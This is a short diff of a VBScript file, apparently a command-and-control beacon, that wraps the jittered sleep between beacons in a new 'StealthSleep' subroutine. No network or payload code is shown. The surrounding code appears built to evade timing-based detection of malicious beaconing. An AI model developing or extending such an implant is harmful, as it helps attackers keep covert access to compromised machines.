@@ -205,6 +205,10 @@
             GetSleepTime = Int(minSleep + (maxSleep - minSleep) * Rnd())
         End Function
 
+        Sub StealthSleep(seconds)
+            WScript.Sleep seconds * 1000
+        End Sub
+
         Function SimpleJsonParse(jsonStr, key)
             ' Very basic JSON value extraction
             Dim searchKey, startPos, endPos, value
@@ -309,7 +313,7 @@
                     ' Sleep with jitter
                     Dim sleepTime
                     sleepTime = GetSleepTime(BEACON_INTERVAL, BEACON_JITTER)
-                    WScript.Sleep sleepTime * 1000
+                    StealthSleep sleepTime
                 End If
             Loop
         End Sub
